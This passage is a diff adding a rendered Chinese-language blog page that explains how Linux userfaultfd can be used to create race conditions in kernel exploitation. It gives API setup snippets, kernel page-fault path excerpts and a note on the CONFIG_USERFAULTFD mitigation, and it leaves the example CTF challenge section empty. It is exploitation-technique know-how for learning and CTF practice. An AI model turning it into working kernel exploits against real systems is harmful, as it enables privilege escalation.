+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="p">.</span><span class="n">show_fdinfo</span>	<span class="o">=</span> <span class="n">userfaultfd_show_fdinfo</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="p">.</span><span class="n">release</span>	<span class="o">=</span> <span class="n">userfaultfd_release</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">poll</span>		<span class="o">=</span> <span class="n">userfaultfd_poll</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">read</span>		<span class="o">=</span> <span class="n">userfaultfd_read</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">unlocked_ioctl</span> <span class="o">=</span> <span class="n">userfaultfd_ioctl</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">compat_ioctl</span>	<span class="o">=</span> <span class="n">compat_ptr_ioctl</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">llseek</span>		<span class="o">=</span> <span class="n">noop_llseek</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><hr>
+<h2 id="仅推进状态">仅推进状态<a hidden class="anchor" aria-hidden="true" href="#仅推进状态">#</a></h2>
+<p>调用 <code>userfaultfd</code> 系统调用后，<code>userfaultfd_ctx.state</code> 被设置为 <code>UFFD_STATE_WAIT_API</code>。要将状态推进到 <code>UFFD_STATE_RUNNING</code>，需要调用 <code>ioctl(UFFDIO_API)</code> 并告诉内核启用了哪些 uffd API 功能。内核会返回结果，但在漏洞利用中我们通常不使用这些信息。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 通过 ioctl(UFFDIO_API) 启用 uffd 对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">uffdio_api</span><span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">uffdio_api</span><span class="p">.</span><span class="n">features</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uffdio_api</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;ioctl-UFFDIO_API&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><hr>
+<h2 id="注册">注册<a hidden class="anchor" aria-hidden="true" href="#注册">#</a></h2>
+<p>要注册要被监控的内存区域，调用 <code>ioctl(UFFDIO_REGISTER)</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 通过 ioctl(UFFDIO_REGISTER) 指定由 userfaultfd 处理的内存区域
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">uffdio_register</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">uffdio_register</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">uffdio_register</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nf">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uffdio_register</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;ioctl-UFFDIO_REGISTER&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>该调用在 <code>fs/userfaultfd.c</code> 的 <code>userfaultfd_register()</code> 中处理。</p>
+<ul>
+<li>检查要监控的 <code>range</code>：
+<ul>
+<li><code>start</code> 地址必须页对齐。</li>
+<li><code>len</code> 必须页对齐。</li>
+<li><code>start</code> 必须大于 <code>mmap_min_addr</code>，默认是 1K。</li>
+<li><code>start</code> 必须小于 <code>task_size</code>。</li>
+</ul>
+</li>
+<li>检查指定范围内的 VMA 是否可以被监控：
+<ul>
+<li>VMA 不能是匿名或者 <code>vma-&gt;vmops</code> 非空。</li>
+<li>VMA 必须有 <code>VM_MAYWRITE</code> 标志。</li>
+<li>VMA 不能已被其他 uffd 监控。</li>
+</ul>
+</li>
+<li>在 VMA 中注册 uffd：
+<ul>
+<li>在 <code>vma-&gt;vma_flags</code> 设置 <code>VM_UFFD_MISSING</code> 位。</li>
+<li>将 <code>ctx</code> 设置到 <code>vma-&gt;vm_userfaultfd_ctx.ctx</code>。</li>
+<li>如果范围包含多个 VMA 或部分 VMA，需要拆分或合并 VMA。</li>
+</ul>
+</li>
+</ul>
+<p>内核会将 <code>uffdio_register.ioctls</code> 填充为可以成功操作该 uffd 的 ioctl，但在漏洞利用中我们不使用这些信息。</p>
+<hr>
+<h2 id="处理页错误">处理页错误<a hidden class="anchor" aria-hidden="true" href="#处理页错误">#</a></h2>
+<p>页错误的处理程序注册如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">SYM_CODE_START</span><span class="p">(</span><span class="n">irq_entries_start</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vector</span><span class="o">=</span><span class="n">FIRST_EXTERNAL_VECTOR</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nf">rept</span> <span class="p">(</span><span class="n">FIRST_SYSTEM_VECTOR</span> <span class="o">-</span> <span class="n">FIRST_EXTERNAL_VECTOR</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">UNWIND_HINT_IRET_REGS</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span> <span class="o">:</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="n">byte</span>	<span class="mh">0x6a</span><span class="p">,</span> <span class="n">vector</span>
+</span></span><span class="line"><span class="cl">	<span class="n">jmp</span>	<span class="n">asm_common_interrupt</span>
+</span></span><span class="line"><span class="cl">	<span class="n">nop</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* 确保上面的指令不超过 8 个字节 */</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span> <span class="o">=</span> <span class="mi">0</span><span class="n">b</span> <span class="o">+</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">	<span class="n">vector</span> <span class="o">=</span> <span class="n">vector</span><span class="o">+</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="n">endr</span>
+</span></span><span class="line"><span class="cl"><span class="nf">SYM_CODE_END</span><span class="p">(</span><span class="n">irq_entries_start</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">snipped</span><span class="p">...)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">DECLARE_IDTENTRY_RAW_ERRORCODE</span><span class="p">(</span><span class="n">X86_TRAP_PF</span><span class="p">,</span>	<span class="n">exc_page_fault</span><span class="p">);</span>
+</span></span></code></pre></div><p>它会调用 <code>handle_page_fault()</code>。函数会检查故障发生在用户态还是内核态。如果在用户态，调用 <code>do_user_addr_fault()</code>。SMAP 也在这里处理。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">(</span><span class="nf">cpu_feature_enabled</span><span class="p">(</span><span class="n">X86_FEATURE_SMAP</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">             <span class="o">!</span><span class="p">(</span><span class="n">hw_error_code</span> <span class="o">&amp;</span> <span class="n">X86_PF_USER</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">             <span class="o">!</span><span class="p">(</span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">X86_EFLAGS_AC</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">bad_area_nosemaphore</span><span class="p">(</span><span class="n">regs</span><span class="p">,</span> <span class="n">hw_error_code</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>总之，<code>mmap()</code> 仅创建新的 VMA，不会设置 PTE（你必须指定 <code>MAP_PRIVATE</code>）。此时，<code>handle_user_addr_fault()</code> 会调用 <code>handle_mm_fault()</code> → <code>__handle_mm_fault()</code> → <code>handle_pte_fault()</code> → <code>do_anonymous_page()</code>，因为 PTE 完全未初始化。在此函数中，由于我们之前设置了 VMA 的 <code>VM_UFFD_MISSING</code> 位，会走如下路径：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">userfaultfd_missing</span><span class="p">(</span><span class="n">vma</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">vmf</span><span class="o">-&gt;</span><span class="n">pte</span><span class="p">,</span> <span class="n">vmf</span><span class="o">-&gt;</span><span class="n">ptl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">put_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">handle_userfault</span><span class="p">(</span><span class="n">vmf</span><span class="p">,</span> <span class="n">VM_UFFD_MISSING</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>此事件会被推入 uffd 上下文的等待队列：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">init_waitqueue_func_entry</span><span class="p">(</span><span class="o">&amp;</span><span class="n">uwq</span><span class="p">.</span><span class="n">wq</span><span class="p">,</span> <span class="n">userfaultfd_wake_function</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">uwq</span><span class="p">.</span><span class="n">wq</span><span class="p">.</span><span class="n">private</span> <span class="o">=</span> <span class="n">current</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">uwq</span><span class="p">.</span><span class="n">msg</span> <span class="o">=</span> <span class="nf">userfault_msg</span><span class="p">(</span><span class="n">vmf</span><span class="o">-&gt;</span><span class="n">address</span><span class="p">,</span> <span class="n">vmf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">,</span> <span class="n">reason</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="n">ctx</span><span class="o">-&gt;</span><span class="n">features</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">uwq</span><span class="p">.</span><span class="n">ctx</span> <span class="o">=</span> <span class="n">ctx</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">uwq</span><span class="p">.</span><span class="n">waken</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">snipped</span><span class="p">...)</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__add_wait_queue</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">fault_pending_wqh</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uwq</span><span class="p">.</span><span class="n">wq</span><span class="p">);</span>
+</span></span></code></pre></div><p>然后，内核等待用户态程序轮询事件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nf">likely</span><span class="p">(</span><span class="n">must_wait</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">READ_ONCE</span><span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">released</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">wake_up_poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">fd_wqh</span><span class="p">,</span> <span class="n">EPOLLIN</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">schedule</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><hr>
+<h2 id="在用户态执行你的操作">在用户态执行你的操作<a hidden class="anchor" aria-hidden="true" href="#在用户态执行你的操作">#</a></h2>
+<p>现在 RIP 回到用户态程序，你可以随意操作。你可以通过轮询 uffd 捕获故障事件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="nf">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pollfd</span><span class="p">.</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLERR</span> <span class="o">||</span> <span class="n">pollfd</span><span class="p">.</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLHUP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;poll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 读取事件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">event</span> <span class="o">!=</span> <span class="n">UFFD_EVENT_PAGEFAULT</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">errExit</span><span class="p">(</span><span class="s">&#34;unexpected pagefault&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[!] page fault: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">msg</span><span class="p">.</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">);</span>
+</span></span></code></pre></div><p>你可以在故障页上复制内容，或者通过 <code>ioctl()</code> 取消对该页的监控。</p>
+<hr>
+<h2 id="缓解措施">缓解措施<a hidden class="anchor" aria-hidden="true" href="#缓解措施">#</a></h2>
+<p><code>userfaultfd</code> 可以通过 <code>CONFIG_USERFAULTFD</code> 配置禁用。如果禁用，你调用任何 uffd 相关函数时，会出现错误提示。</p>
+<h2 id="例题-qwb2021-notebook">例题 QWB2021-notebook<a hidden class="anchor" aria-hidden="true" href="#例题-qwb2021-notebook">#</a></h2>
+<h3 id="分析-1">分析<a hidden class="anchor" aria-hidden="true" href="#分析-1">#</a></h3>
+<h3 id="思路-1">思路<a hidden class="anchor" aria-hidden="true" href="#思路-1">#</a></h3>
+<h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/race/userfaultfd/#_1">用 userfaultfd 创造条件竞争 - CTF Wiki</a>
+<a href="https://ltfa1l.top/2024/07/20/system/kernel/Linux_kernel2_%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">0x03. Linux kernel基础：条件竞争 - Ltfall&rsquo;s Code</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
